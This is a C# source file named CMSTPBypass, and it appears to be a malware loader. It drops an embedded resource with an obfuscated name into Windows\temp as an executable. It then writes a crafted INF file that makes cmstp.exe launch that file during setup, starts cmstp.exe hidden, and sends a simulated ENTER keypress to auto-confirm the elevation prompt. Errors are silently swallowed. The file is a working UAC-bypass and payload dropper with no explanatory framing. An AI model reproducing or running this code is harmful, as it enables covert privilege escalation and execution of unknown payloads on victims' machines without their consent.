using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class CMSTPBypass
{
	public static string InfData = "[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n[DefaultInstall]\nCustomDestination=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n\n[RunPreSetupCommandsSection]\n; Commands Here will be run Before Setup Begins to install\nREPLACE_COMMAND_LINE\ntaskkill /IM cmstp.exe /F\n\n[CustInstDestSectionAllUsers]\n49000,49001=AllUSer_LDIDSection, 7\n\n[AllUSer_LDIDSection]\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n\n[Strings]\nServiceName=\"Crimson\"\nShortSvcName=\"Crimson\"\n\n";

	public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	public static string SetInfFile(string CommandToExecute)
	{
		string value = Path.GetRandomFileName().Split(new char[1] { Convert.ToChar(".") })[0];
		string value2 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp";
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(value2);
		stringBuilder.Append("\\");
		stringBuilder.Append(value);
		stringBuilder.Append(".inf");
		StringBuilder stringBuilder2 = new StringBuilder(InfData);
		stringBuilder2.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
		File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString());
		return stringBuilder.ToString();
	}

	public static void Main()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp\\" + Path.GetRandomFileName().Split(new char[1] { Convert.ToChar(".") })[0] + ".exe";
			File.WriteAllBytes(text, GetResource("wgo0zlwuhqj"));
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(SetInfFile("cmd /c start \"" + text + "\""));
			ProcessStartInfo processStartInfo = new ProcessStartInfo(BinaryPath);
			processStartInfo.Arguments = "/au " + stringBuilder.ToString();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			IntPtr intPtr = default(IntPtr);
			intPtr = IntPtr.Zero;
			do
			{
				intPtr = SetWindowActive("cmstp");
			}
			while (intPtr == IntPtr.Zero);
			SendKeys.SendWait("{ENTER}");
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static IntPtr SetWindowActive(string ProcessName)
	{
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		if (processesByName.Length == 0)
		{
			return IntPtr.Zero;
		}
		processesByName[0].Refresh();
		IntPtr intPtr = default(IntPtr);
		intPtr = processesByName[0].MainWindowHandle;
		if (intPtr == IntPtr.Zero)
		{
			return IntPtr.Zero;
		}
		SetForegroundWindow(intPtr);
		ShowWindow(intPtr, 5);
		return intPtr;
	}

	private static byte[] GetResource(string file)
	{
		ResourceManager resourceManager = new ResourceManager("jykqcwzmkzw", Assembly.GetExecutingAssembly());
		return (byte[])resourceManager.GetObject(file);
	}
}
